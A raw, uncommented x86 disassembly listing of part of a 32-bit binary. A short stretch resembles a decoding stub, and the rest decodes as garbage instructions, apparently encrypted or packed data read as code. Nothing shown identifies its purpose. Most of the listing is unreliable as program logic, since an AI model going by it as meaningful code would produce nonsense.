  409b3e:	frstor [ebp+esi*8+0x2ce32a4d]
  409b45:	gs push ds
  409b47:	and    eax,0x50bd3a21
  409b4c:	xor    DWORD PTR [edi+ecx*1-0x2741d7a6],0x3b9eb574
  409b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b58:	or     ebp,DWORD PTR [edi]
  409b5a:	sti    
  409b5b:	inc    edx
  409b5c:	xor    DWORD PTR [eax],edi
  409b5e:	and    al,0x34
  409b60:	jae    0x409aff
  409b62:	add    esp,DWORD PTR [ebx]
  409b64:	xor    BYTE PTR [edx-0x4f1e43b],bl
  409b6a:	in     eax,0x89
  409b6c:	inc    ebp
  409b6d:	shr    BYTE PTR [ecx],0x15
  409b70:	add    DWORD PTR [ebp+0x43],0x0
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4344df
  409b7f:	or     DWORD PTR ds:0x43454f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43457f
  409b8f:	xor    DWORD PTR ds:0x434583,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43456b
  409bb7:	mov    edi,DWORD PTR ds:0x434623
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	pop    ecx
  409bd4:	xchg   ebp,eax
  409bd5:	das    
  409bd6:	fisttp QWORD PTR [esi+0x707e7eea]
  409bdc:	jns    0x409c5c
  409bde:	jle    0x409c1f
  409be0:	or     al,0x3
  409be2:	inc    edi
  409be3:	push   ds
  409be4:	xchg   BYTE PTR [esi+0x5f4ec788],bl
  409bea:	test   DWORD PTR [eax-0x23],edx
  409bed:	ret    
  409bee:	sar    WORD PTR [eax],cl
  409bf1:	es sbb edi,ebx
  409bf4:	mov    ch,BYTE PTR [eax+0x65]
  409bf7:	and    ecx,ecx
  409bf9:	or     edx,esp
  409bfb:	pop    es
  409bfc:	push   ds
  409bfd:	mov    fs,esi
  409bff:	hlt    
  409c00:	ja     0x409c7d
  409c02:	push   ds
  409c03:	ror    DWORD PTR [ecx],0x72
  409c06:	push   0x66
  409c08:	jo     0x409c01
  409c0a:	(bad)  
  409c0b:	call   FWORD PTR [esi-0x34a93cd3]
  409c11:	mov    esp,0x2f92f449
  409c16:	jns    0x409bb5
  409c18:	retf   0xebf5
  409c1b:	pop    esp
  409c1c:	mov    bh,0xdf
  409c1e:	(bad)  
  409c1f:	xlat   BYTE PTR ds:[ebx]
  409c20:	mov    ch,0xe5
  409c22:	jmp    0x659b3385
  409c27:	mov    dh,0xba
  409c29:	or     edi,DWORD PTR [ecx-0x3aa283c0]
  409c2f:	mov    ds,WORD PTR [ebx*8-0x680141ca]
  409c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c37:	dec    edx
  409c38:	dec    ebx
  409c39:	popa   
  409c3a:	mov    dh,0xf7
  409c3c:	int    0xaa
  409c3e:	xchg   ecx,eax
  409c3f:	rcl    DWORD PTR [ebp+0x905626b],cl
  409c45:	jbe    0x409ca5
  409c47:	xor    al,0xc6
  409c49:	fcomip st,st(3)
  409c4b:	shl    DWORD PTR [edx+0x15],1
  409c4e:	adc    eax,0xe46ba209
  409c53:	pop    esi
  409c54:	or     eax,0x339d8fa
  409c59:	jg     0x409bf4
  409c5b:	dec    eax
  409c5c:	lahf   
  409c5d:	cmp    al,0xe2
  409c5f:	inc    esi
  409c60:	out    0x32,al
  409c62:	cmp    ch,0x82
  409c65:	push   cs
  409c66:	pop    ss
  409c67:	jecxz  0x409c38
  409c69:	js     0x409ca8
  409c6b:	mov    BYTE PTR [esp+ebp*1+0x75798565],dl
  409c72:	push   0xffffff94
  409c74:	sub    al,0x51
  409c76:	popa   
  409c77:	add    ch,BYTE PTR [ecx+0x58]
  409c7a:	mov    edx,0xe7afb3e0
  409c7f:	push   0xc42ef75d
  409c84:	jmp    0xf785:0x9aab64eb
  409c8b:	xchg   ebp,eax
  409c8c:	jo     0x409c75
  409c8e:	ins    BYTE PTR es:[edi],dx
  409c8f:	repz das 
  409c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c92:	add    ebp,esi
  409c94:	test   eax,0x49dc4c8
  409c99:	jbe    0x409c33
  409c9b:	dec    edi
  409c9c:	jno    0x409c1f
  409c9e:	pop    es
  409c9f:	dec    ebx
  409ca0:	repz mov ebp,0x1a3ee693
  409ca6:	adc    al,0x23
  409ca8:	test   eax,0xe44a6903
  409cad:	mov    DWORD PTR [eax-0x73],ebx
  409cb0:	bnd jns 0x409c64
  409cb3:	lods   al,BYTE PTR ds:[esi]
  409cb4:	outs   dx,DWORD PTR ds:[esi]
  409cb5:	push   cs
  409cb6:	mov    al,ds:0x9fd3ef40
  409cbb:	ins    BYTE PTR es:[edi],dx
  409cbc:	fdiv   QWORD PTR [eax]
  409cbe:	pop    ecx
  409cbf:	hlt    
  409cc0:	ja     0x409c66
  409cc2:	fcom   QWORD PTR [edi+0x7c]
  409cc5:	fisttp QWORD PTR [eax]
  409cc7:	mov    ds:0x3c40442b,al
  409ccc:	imul   BYTE PTR [ebx]
  409cce:	cmc    
  409ccf:	fwait
  409cd0:	stc    
  409cd1:	rcr    DWORD PTR [ecx+0x780997ca],1
  409cd7:	pop    edx
  409cd8:	push   ebp
  409cd9:	add    bh,bl
  409cdb:	(bad)  
  409cdc:	imul   BYTE PTR [edx-0xf]
  409cdf:	push   0xffffffef
  409ce1:	jnp    0x409d41
  409ce3:	ja     0x409cfc
  409ce5:	into   
  409ce6:	xchg   bh,dh
  409ce8:	loopne 0x409d3a
  409cea:	int    0xcf
  409cec:	mov    dh,0x7e
  409cee:	sbb    DWORD PTR [ecx+ecx*4-0x16],ecx
  409cf2:	mov    eax,ds:0xc4f1adb2
  409cf7:	xchg   al,bl
  409cf9:	mov    cl,0x1e
  409cfb:	sbb    eax,0x9ca2ee20
  409d00:	repz jl 0x409cdc
  409d03:	and    ecx,DWORD PTR [esi+0x6d76e419]
  409d09:	sub    al,0xcd
  409d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0c:	pushf  
  409d0d:	test   dh,bl
  409d0f:	cmp    bl,BYTE PTR [edi]
  409d11:	ret    
  409d12:	push   esp
  409d13:	pop    es
  409d14:	dec    edi
  409d15:	xor    eax,0x17c313b3
  409d1a:	iret   
  409d1b:	sbb    DWORD PTR [edi+eiz*2+0x7fe38f3c],edx
  409d22:	inc    ebx
  409d23:	sub    cl,BYTE PTR [ebx-0x1d]
  409d26:	mov    bh,0xc5
  409d28:	repz push edi
  409d2a:	iret   
  409d2b:	mov    ebx,0x472e0ac5
  409d30:	or     eax,0xcfc81bc1
  409d35:	leave  
  409d36:	xlat   BYTE PTR ds:[ebx]
  409d37:	pop    ds
  409d38:	pop    eax
  409d39:	repnz cli 
  409d3b:	mov    ds:0x9361d7e6,al
  409d40:	je     0x409d9d
  409d42:	leave  
  409d43:	call   0x9abcb569
  409d48:	hlt    
  409d49:	jle    0x409d8f
  409d4b:	retf   
  409d4c:	enter  0x26ca,0xb7
  409d50:	cmp    al,0xd9
  409d52:	add    al,0xc5
  409d54:	push   0x6c7849e9
  409d59:	cmp    eax,0x21b49422
  409d5e:	mov    WORD PTR [eax+eax*8-0x26890dbb],fs
  409d65:	mov    esi,0x2d86d023
  409d6a:	mov    ah,0x7f
  409d6c:	pop    edx
  409d6d:	or     eax,esp
  409d6f:	add    cl,BYTE PTR [ecx+0x1106306]
  409d75:	sti    
  409d76:	cmp    esi,DWORD PTR [edi+0x10]
  409d79:	pop    edx
  409d7a:	(bad)  [esi+0x1a]
  409d7d:	sbb    BYTE PTR [ecx+0x31],ch
  409d80:	or     al,0x1f
  409d82:	adc    DWORD PTR [eax],esp
  409d84:	inc    ebp
  409d85:	or     DWORD PTR [ebp-0x7d],edx
  409d88:	jp     0x409d96
  409d8a:	or     eax,ebx
  409d8c:	lods   eax,DWORD PTR ds:[esi]
  409d8d:	ret    0xa7fd
  409d90:	sub    BYTE PTR [ecx+0x4889b475],cl
  409d96:	mov    cl,0xeb
  409d98:	add    ch,ah
  409d9a:	sub    esp,ebp
  409d9c:	add    eax,0x582a98c0
  409da1:	cmp    ebx,DWORD PTR [ebp-0x3109c6e6]
  409da7:	rcr    DWORD PTR [ecx],0xa3
  409daa:	ds xor esp,edx
  409dad:	imul   esi,DWORD PTR [ebx-0x42],0xc
  409db1:	retf   
  409db2:	jecxz  0x409de3
  409db4:	push   edi
  409db5:	push   edi
  409db6:	mov    ch,0x41
  409db8:	out    dx,al
  409db9:	dec    ecx
  409dba:	adc    bl,BYTE PTR [ecx+0x111fb763]
  409dc0:	mov    ecx,DWORD PTR [ecx]
  409dc2:	inc    edx
  409dc3:	push   ds
  409dc4:	rcl    DWORD PTR [edi+0x18223cd2],0xa2
  409dcb:	sub    al,0x76
  409dcd:	mov    edx,0xedb2528a
  409dd2:	add    BYTE PTR [edx-0x614e2f46],dl
  409dd8:	hlt    
  409dd9:	add    BYTE PTR [ebp+0x6d],bh
  409ddc:	xchg   ebx,eax
  409ddd:	ret    0x1104
  409de0:	inc    edx
  409de1:	mov    ecx,0x908e0ecf
  409de6:	leave  
  409de7:	sti    
  409de8:	inc    eax
  409de9:	hlt    
  409dea:	std    
  409deb:	xchg   edx,eax
  409dec:	or     ch,BYTE PTR [esi+0x3c]
  409def:	mov    dl,0x62
  409df1:	push   0x59766323
  409df6:	xor    bl,bh
  409df8:	lods   eax,DWORD PTR ss:[esi]
  409dfa:	cs das 
  409dfc:	fwait
  409dfd:	and    cl,0xe5
  409e00:	mov    dh,0x52
  409e02:	out    dx,eax
  409e03:	xchg   ebx,eax
  409e04:	jecxz  0x409e31
  409e06:	out    0x17,eax
  409e08:	pop    edx
  409e09:	sbb    ch,BYTE PTR [edx+ebp*4+0x217d847b]
  409e10:	add    BYTE PTR ds:0xebda3079,0xc4
  409e17:	jae    0x409dd2
  409e19:	push   ebx
  409e1a:	sbb    DWORD PTR [esi],esi
  409e1c:	pop    es
  409e1d:	pop    esp
  409e1e:	push   eax
  409e1f:	jle    0x409ddb
  409e21:	adc    eax,0xac76473d
  409e26:	mov    ds:0x6cb9e34a,eax
  409e2b:	jne    0x409e7d
  409e2d:	fist   WORD PTR [edi+ebp*2+0x5d49f3f7]
  409e34:	mov    ds:0xec172755,al
  409e39:	ret    0x6cfb
  409e3c:	sbb    bh,ch
  409e3e:	cmp    ecx,DWORD PTR [ebp-0x6]
  409e41:	call   0xbd49:0xa300deb7
  409e48:	sbb    cl,0xf6
  409e4b:	xlat   BYTE PTR ds:[ebx]
  409e4c:	hlt    
  409e4d:	fcom   DWORD PTR [edi-0x25138be0]
  409e53:	fwait
  409e54:	pop    ds
  409e55:	loopne 0x409de3
  409e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e58:	(bad)  
  409e59:	dec    esi
  409e5a:	jns    0x409ed7
  409e5c:	test   DWORD PTR [ebp+0x600e3461],ebx
  409e62:	lahf   
  409e63:	xchg   BYTE PTR [edx-0x53],dl
  409e66:	retf   
  409e67:	out    dx,eax
  409e68:	fisubr WORD PTR [ebp+ebx*4-0x15]
  409e6c:	fcomp  DWORD PTR [edi+0x3abf4552]
  409e72:	sub    ah,BYTE PTR [ebx-0x3490d945]
  409e78:	ret    0x576e
  409e7b:	xor    DWORD PTR [esi],0xf150a466
  409e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e82:	sub    ecx,edi
  409e84:	mov    ebx,0xb344576
  409e89:	leave  
  409e8a:	bnd jbe 0x409e60
  409e8d:	aaa    
  409e8e:	adc    ebx,DWORD PTR [edi-0x56]
  409e91:	shr    BYTE PTR [ecx],1
  409e93:	push   eax
  409e94:	mov    ds:0xaed15308,al
  409e99:	lods   al,BYTE PTR ds:[esi]
  409e9a:	adc    BYTE PTR ds:[edi+0x75],ah
  409e9e:	in     al,0x64
  409ea0:	fxtract 
  409ea2:	xor    al,0x1d
  409ea4:	les    ecx,FWORD PTR [ebx]
  409ea6:	lock add esp,DWORD PTR [ebx-0x1d]
  409eaa:	xor    cl,BYTE PTR [edx-0x7260fb75]
  409eb0:	adc    eax,0x4a7544aa
  409eb5:	and    BYTE PTR [esi+ecx*4-0x43],cl
  409eb9:	or     al,0x8f
  409ebb:	neg    esi
  409ebd:	ror    DWORD PTR [esi],cl
  409ebf:	arpl   WORD PTR [eax-0x101b20d5],bx
  409ec5:	xor    eax,0x503e0865
  409eca:	xor    cl,BYTE PTR [ecx+0x76019251]
  409ed0:	jb     0x409f4e
  409ed2:	and    ebx,DWORD PTR [eax]
  409ed4:	int    0x38
  409ed6:	add    DWORD PTR [ecx],ebx
  409ed8:	imul   ebp,DWORD PTR [esi],0xffffffb9
  409edb:	or     al,0xfd
  409edd:	and    DWORD PTR [edx+0x6d],ebp
  409ee0:	xchg   esi,eax
  409ee1:	sub    eax,DWORD PTR [ebx+0x7db8e8a6]
  409ee7:	xlat   BYTE PTR ds:[ebx]
  409ee8:	prefetcht1 BYTE PTR [esi-0x298e9e5b]
  409eef:	fisttp QWORD PTR [ebx-0x502598ce]
  409ef5:	cmp    edi,DWORD PTR ds:0x3fd5cfbc
  409efb:	add    ch,ah
  409efd:	cmp    BYTE PTR [ebp+edi*1-0x78a14761],cl
  409f04:	call   0xd46a3cdc
  409f09:	and    eax,0x9b6a043
  409f0e:	jb     0x409eef
  409f10:	xchg   edx,eax
  409f11:	jno    0x409f31
  409f13:	sar    DWORD PTR [ecx],cl
  409f15:	int    0x8e
  409f17:	test   al,0x9a
  409f19:	dec    ecx
  409f1a:	les    eax,FWORD PTR [edi-0x27c63fc7]
  409f20:	add    al,0xca
  409f22:	and    BYTE PTR [eax+0x4a8524a9],bh
  409f28:	sbb    ah,0x81
  409f2b:	xor    eax,ecx
  409f2d:	and    bl,BYTE PTR [eax-0x1f]
  409f30:	inc    esi
  409f31:	adc    DWORD PTR [ebx-0xa],0x6c
  409f35:	sbb    DWORD PTR [esi+0x3e],edx
  409f38:	cmp    BYTE PTR [ebx],bh
  409f3a:	sbb    DWORD PTR [eax+0x1f],ebx
  409f3d:	mov    ds:0x19f4256f,eax
  409f42:	popf   
  409f43:	jb     0x409f48
  409f45:	cmp    bh,BYTE PTR [esi-0x18]
  409f48:	sbb    dh,BYTE PTR gs:[edi-0x7a6f019f]
  409f4f:	mov    bl,0xae
  409f51:	dec    esp
  409f52:	adc    ecx,ecx
  409f54:	inc    esp
  409f55:	jns    0x409fba
  409f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f58:	mov    al,ds:0xe7f22912
  409f5d:	cmp    BYTE PTR [edi+edi*4+0x7b944a38],ch
  409f64:	mov    edx,0xd7ab6acd
  409f69:	pop    es
  409f6a:	cmp    al,0xeb
  409f6c:	inc    edx
  409f6d:	fdiv   QWORD PTR [esi+eax*2-0x36]
  409f71:	mov    ebx,0x2f901e3
  409f76:	dec    esp
  409f77:	xchg   DWORD PTR [edx],ecx
  409f79:	cmp    ebx,DWORD PTR [eax]
  409f7b:	data16 hlt 
  409f7d:	in     al,0x60
  409f7f:	dec    ecx
  409f80:	repz sbb ah,BYTE PTR gs:[edi+0x57b59790]
  409f88:	in     eax,0xd5
  409f8a:	xchg   DWORD PTR [ecx-0x3e],esi
  409f8d:	in     eax,dx
  409f8e:	ja     0x409fe6
  409f90:	cdq    
  409f91:	out    dx,eax
  409f92:	cdq    
  409f93:	test   DWORD PTR [esi+ebx*8+0x7e],0x9f32764a
  409f9b:	inc    ecx
  409f9c:	mov    ch,0x25
  409f9e:	mov    eax,ds:0x48168f63
  409fa3:	fucomip st,st(0)
  409fa5:	add    ebx,edx
  409fa7:	mov    cl,BYTE PTR [ebp+0x21]
  409faa:	inc    ecx
  409fab:	xchg   esp,eax
  409fac:	add    dl,bl
  409fae:	jg     0x409f4c
  409fb0:	or     DWORD PTR ds:0x2e2137a7,eax
  409fb6:	mov    eax,esi
  409fb8:	xchg   ebp,eax
  409fb9:	and    dh,BYTE PTR [esi]
  409fbb:	in     eax,0x81
  409fbd:	xchg   esi,eax
  409fbe:	xchg   ebp,eax
  409fbf:	fld    DWORD PTR [edx-0x71e8c82a]
  409fc5:	or     DWORD PTR [edi],ebp
  409fc7:	cli    
  409fc8:	xchg   ebp,eax
  409fc9:	popa   
  409fca:	sbb    cl,ah
  409fcc:	aaa    
  409fcd:	jmp    0x774e:0x8fa9e4ad
  409fd4:	or     edi,DWORD PTR [edi-0x38cccda8]
  409fda:	inc    ebp
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fstp   DWORD PTR [ebx+0x2]
  409ff5:	add    BYTE PTR [eax+eax*4],bl
  409ff8:	idiv   BYTE PTR [esi+0x7e]
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	mov    ch,0x7e
  40a001:	cmp    bh,BYTE PTR [ecx-0x3b7441bd]
  40a007:	or     al,0xc8
  40a009:	dec    ebp
  40a00a:	mov    dl,0x12
  40a00c:	or     al,0x7a
  40a00e:	out    dx,al
  40a00f:	rcl    BYTE PTR [edi],1
  40a011:	jo     0x409fcc
  40a013:	dec    eax
  40a014:	mov    esi,0xbb29b950
  40a019:	and    DWORD PTR [edi],eax
  40a01b:	sub    cl,BYTE PTR [eax*4-0x25913926]
  40a022:	ret    0xb4d
  40a025:	hlt    
  40a026:	inc    edi
  40a027:	mov    esi,0x72c21ab2
  40a02c:	jno    0x409fe4
  40a02e:	and    esi,ecx
  40a030:	fnsave [esi-0xa]
  40a033:	(bad)  
  40a034:	sbb    eax,0xddbe3f60
  40a039:	ss mov esp,0xf8ed6ac3
  40a03f:	adc    DWORD PTR [esi+0x69],0x2e
  40a043:	inc    ebp
  40a044:	minps  xmm3,XMMWORD PTR [esi-0x7d]
  40a048:	repnz sub cl,ah
  40a04b:	xor    ebp,eax
  40a04d:	fcom   QWORD PTR [edi+edx*1+0x26d0b29]
  40a054:	stos   DWORD PTR es:[edi],eax
  40a055:	fnstenv [edi-0x74]
  40a058:	jne    0x40a0d3
  40a05a:	mov    ah,0x9b
  40a05c:	scas   al,BYTE PTR es:[edi]
  40a05d:	xchg   DWORD PTR [esi],esi
  40a05f:	push   0xfeda0487
  40a064:	iret   
  40a065:	push   esi
  40a066:	mov    ds:0xed3c50d5,eax
  40a06b:	push   eax
  40a06c:	mov    eax,0x3f02e762
  40a071:	push   ecx
  40a072:	pushf  
  40a073:	add    eax,0x181ce04f
  40a078:	fsub   DWORD PTR [ebx-0x7fd0052e]
  40a07e:	call   0x593b9e08
  40a083:	cs sti 
  40a085:	(bad)  
  40a086:	std    
  40a087:	in     eax,dx
  40a088:	xor    esi,DWORD PTR [ebx+0x4566eec6]
  40a08e:	jnp    0x40a04e
  40a090:	pusha  
  40a091:	rcr    DWORD PTR [ebx+0x48],cl
  40a094:	sbb    BYTE PTR [edx+ebp*2+0x48b5714a],cl
  40a09b:	sar    DWORD PTR [ebp-0x1517268a],cl
  40a0a1:	sbb    dh,dl
  40a0a3:	clc    
  40a0a4:	mov    ds:0xaccb3775,eax
  40a0a9:	cld    
  40a0aa:	fisub  DWORD PTR [ebx+ebp*4+0x3031b19a]
  40a0b1:	jo     0x40a0a9
  40a0b3:	jb     0x40a0e9
  40a0b5:	pop    ebx
  40a0b6:	xor    dl,BYTE PTR [edi-0x589f6b1]
  40a0bc:	push   ds
  40a0bd:	data16 jns 0x40a091
  40a0c0:	mov    BYTE PTR [ebx-0xc2fdbcb],cl
  40a0c6:	aad    0x90
  40a0c8:	push   ebp
  40a0c9:	out    0x59,al
  40a0cb:	out    0x98,eax
  40a0cd:	mov    edx,0x5f6a65a1
  40a0d2:	inc    edi
  40a0d3:	and    BYTE PTR [edi],al
  40a0d5:	sub    BYTE PTR [edx-0x43],bh
  40a0d8:	jle    0x40a073
  40a0da:	push   cs
  40a0db:	inc    ecx
  40a0dc:	mov    ah,0xd8
  40a0de:	mov    edi,0x4702a9e9
  40a0e3:	fdivr  DWORD PTR [ecx]
  40a0e5:	test   DWORD PTR [eax+0x5],0x54c3d99d
  40a0ec:	stos   DWORD PTR es:[edi],eax
  40a0ed:	add    eax,0xec4bffe
  40a0f2:	repz mov ah,0x8e
  40a0f5:	lock inc ebx
  40a0f7:	dec    edi
  40a0f8:	je     0x40a150
  40a0fa:	and    al,0xff
  40a0fc:	es jmp 0x40a129
  40a0ff:	xchg   esi,eax
  40a100:	js     0x40a13f
  40a102:	xlat   BYTE PTR ds:[ebx]
  40a103:	fiadd  DWORD PTR [edi-0x1621ddb6]
  40a109:	jb     0x40a10b
  40a10b:	adc    BYTE PTR ss:[edi],bl
  40a10e:	rol    BYTE PTR [eax-0x2b591f0e],cl
  40a114:	dec    ecx
  40a115:	mov    DWORD PTR [ebx],esi
  40a117:	outs   dx,DWORD PTR ds:[esi]
  40a118:	mov    ah,0xaf
  40a11a:	scas   eax,DWORD PTR es:[edi]
  40a11b:	leave  
  40a11c:	into   
  40a11d:	outs   dx,DWORD PTR ds:[esi]
  40a11e:	push   eax
  40a11f:	bound  ecx,QWORD PTR [edi]
  40a121:	lods   al,BYTE PTR ds:[esi]
  40a122:	and    al,0x2c
  40a124:	push   cs
  40a125:	cmp    esp,DWORD PTR [edx+0x1c]
  40a128:	and    dl,dh
  40a12a:	int3   
  40a12b:	fst    DWORD PTR [edx+0xb70832b]
  40a131:	add    bl,BYTE PTR [esi-0x76c2380d]
  40a137:	pop    eax
  40a138:	test   BYTE PTR [edx],0xb1
  40a13b:	xchg   edi,eax
  40a13c:	sub    DWORD PTR [ecx+0x3cdda7d0],0x8a1295
  40a146:	int3   
  40a147:	or     BYTE PTR [eax+0x3fac318],dh
  40a14d:	dec    esp
  40a14e:	inc    ecx
  40a14f:	add    al,0x31
  40a151:	push   ds
  40a152:	int3   
  40a153:	in     eax,0x95
  40a155:	pop    ebp
  40a156:	and    BYTE PTR [edx-0x3fb82e14],ah
  40a15c:	sub    DWORD PTR [edx+0x74],eax
  40a15f:	xchg   DWORD PTR ds:0x10af2fe6,edx
  40a165:	or     al,0x6f
  40a167:	pop    edx
  40a168:	push   ds
  40a169:	mov    edx,0xbb251f32
  40a16e:	js     0x40a1cc
  40a170:	jno    0x40a1c6
  40a172:	adc    DWORD PTR [edx+0x3b4f8b24],ebp
  40a178:	mov    dl,0x84
  40a17a:	xchg   ebx,eax
  40a17b:	mov    ecx,ebx
  40a17d:	fdiv   QWORD PTR [ebp-0x38ef035f]
  40a183:	pop    edi
  40a184:	arpl   WORD PTR [eax-0xa804c4f],cx
  40a18a:	and    ch,BYTE PTR [ebx-0x26]
  40a18d:	imul   ecx,DWORD PTR [edi+edx*8-0x40],0x750ce7ac
  40a195:	sar    DWORD PTR [eax+edi*4],1
  40a198:	stos   DWORD PTR es:[edi],eax
  40a199:	push   cs
  40a19a:	test   DWORD PTR [esi],0x2a4cb53a
  40a1a0:	into   
  40a1a1:	jg     0x40a142
  40a1a3:	xchg   ecx,ecx
  40a1a5:	clc    
  40a1a6:	add    edi,DWORD PTR [ebx-0x4ac44b39]
  40a1ac:	mov    ch,0x2d
  40a1ae:	std    
  40a1af:	pop    ds
  40a1b0:	sbb    esi,DWORD PTR [edx+0x60276393]
  40a1b6:	jp     0x40a175
  40a1b8:	aam    0xc3
  40a1ba:	sub    eax,0xbc8cef61
  40a1bf:	dec    esi
  40a1c0:	in     al,dx
  40a1c1:	dec    ecx
  40a1c2:	push   cs
  40a1c3:	inc    DWORD PTR [ebp-0x4f]
  40a1c6:	inc    esi
  40a1c7:	or     al,0x3e
  40a1c9:	imul   esp,DWORD PTR [ecx-0x1e],0x2d
  40a1cd:	jmp    0x84dd:0x38bb0bc9
  40a1d4:	cmp    ch,ah
  40a1d6:	pop    ds
  40a1d7:	xchg   BYTE PTR [esi],dh
  40a1d9:	loop   0x40a1f1
  40a1db:	fisub  DWORD PTR [ebx]
  40a1dd:	add    eax,0xaa287988
  40a1e2:	(bad)  
  40a1e4:	sub    eax,0xaf52ccb8
  40a1e9:	dec    DWORD PTR [eax+0x5a]
  40a1ec:	push   eax
  40a1ed:	xchg   esi,eax
  40a1ee:	push   ecx
  40a1ef:	xchg   esp,eax
  40a1f0:	mov    ch,0xdd
  40a1f2:	repnz mov edi,esp
  40a1f5:	mov    cl,0x41
  40a1f7:	not    DWORD PTR [edi-0xf]
  40a1fa:	xor    BYTE PTR [ebp+0x43f3b80c],cl
  40a200:	leave  
  40a201:	mov    ds:0xf7cd4b,eax
  40a206:	and    ebp,DWORD PTR [esi-0x6e]
  40a209:	push   eax
  40a20a:	ss stos DWORD PTR es:[edi],eax
  40a20c:	jmp    0xaab3d745
  40a211:	popf   
  40a212:	jae    0x40a229
  40a214:	mov    bl,0x3e
  40a216:	cld    
  40a217:	pop    edx
  40a218:	arpl   WORD PTR [ebx-0x195fb0ba],di
  40a21e:	outs   dx,BYTE PTR ds:[esi]
  40a21f:	dec    edi
  40a220:	mov    ah,0xfb
  40a222:	lock pop edi
  40a224:	mov    edx,0x70995adf
  40a229:	(bad)  
  40a22a:	and    edx,esp
  40a22c:	fstp   DWORD PTR [esp+edi*1]
  40a22f:	cmp    DWORD PTR [ebx-0x2c],ebx
  40a232:	loopne 0x40a255
  40a234:	xchg   esi,eax
  40a235:	mov    edi,0x4179138d
  40a23a:	mov    edx,0x5b473c93
  40a23f:	mov    ds:0xa602e0b7,al
  40a244:	aaa    
  40a245:	add    ch,BYTE PTR [ecx+ebx*8+0x67]
  40a249:	iret   
  40a24a:	ins    BYTE PTR es:[edi],dx
  40a24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a24c:	jae    0x40a2ae
  40a24e:	or     esp,DWORD PTR [ecx]
  40a250:	mov    ds:0x322fffdb,eax
  40a255:	inc    ecx
  40a256:	push   eax
  40a257:	xor    al,0x55
  40a259:	xor    eax,0xc0582044
  40a25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a25f:	ds sbb al,0x64
  40a262:	and    eax,0x145a2a67
  40a267:	push   eax
  40a268:	call   0x511b:0xe72c4f36
  40a26f:	jmp    0x7c6f4f7e
  40a274:	mov    al,0x16
  40a276:	in     al,dx
  40a277:	mov    ?,WORD PTR [ebp-0x25]
  40a27a:	in     al,0x4a
  40a27c:	jle    0x40a22e
  40a27e:	inc    ebp
  40a27f:	loope  0x40a265
  40a281:	pusha  
  40a282:	fwait
  40a283:	mov    edi,0xda667571
  40a289:	lock repz cmp DWORD PTR [esi+0x34bfd5fc],0x1faef00a
  40a295:	das    
  40a296:	and    ah,ah
  40a298:	mov    ebx,0xcdaea930
  40a29d:	jg     0x40a2a7
  40a29f:	or     DWORD PTR [ecx-0x4d11911a],edi
  40a2a5:	std    
  40a2a6:	xor    ebp,DWORD PTR ss:[ebx+0x3347a9da]
  40a2ad:	push   eax
  40a2ae:	add    dl,0x6
  40a2b1:	ss jns 0x40a333
  40a2b4:	pop    es
  40a2b5:	frstor [edi-0x5a9f494]
  40a2bb:	pushaw 
  40a2bd:	xchg   ebp,eax
  40a2be:	jle    0x40a2a3
  40a2c0:	add    eax,0xb0c7d154
  40a2c5:	cmp    DWORD PTR [ebx],esp
  40a2c7:	(bad)  
  40a2c9:	mov    esi,0xdf9f4859
  40a2ce:	cmp    al,0x16
  40a2d0:	fsubr  DWORD PTR [edx-0x640c904b]
  40a2d6:	mov    al,0x34
  40a2d8:	cwde   
  40a2d9:	and    eax,0xbeb133d4
  40a2de:	mov    edi,ds
  40a2e0:	push   eax
  40a2e1:	es mov edi,0xc077dc31
  40a2e7:	pop    ebp
  40a2e8:	icebp  
  40a2e9:	in     al,0x4d
  40a2eb:	scas   al,BYTE PTR es:[edi]
  40a2ec:	sbb    eax,0x8b2fbd09
  40a2f1:	fisttp QWORD PTR [edi+ebp*8]
  40a2f4:	not    ebp
  40a2f6:	cli    
  40a2f7:	fmulp  st(3),st
  40a2f9:	dec    esp
  40a2fa:	test   DWORD PTR [esi+0x35],esi
  40a2fd:	xor    BYTE PTR [esi+edi*4],ch
  40a300:	and    al,0x9
  40a302:	rcr    BYTE PTR [edx+0xb],0x13
  40a306:	and    BYTE PTR [esi],ch
  40a308:	into   
  40a309:	or     al,0x54
  40a30b:	and    DWORD PTR [esi-0x3b],ebx
  40a30e:	xchg   edx,eax
  40a30f:	mov    ah,0xf0
  40a311:	shl    DWORD PTR [eax+0x520346aa],cl
  40a317:	xchg   edx,eax
  40a318:	xor    eax,ecx
  40a31a:	xchg   ebx,eax
  40a31b:	mov    ah,0x42
  40a31d:	(bad)  
  40a31e:	or     DWORD PTR [esi-0x4a425523],ebp
  40a324:	shl    DWORD PTR ss:[ebp+0x329bfd33],cl
  40a32b:	nop
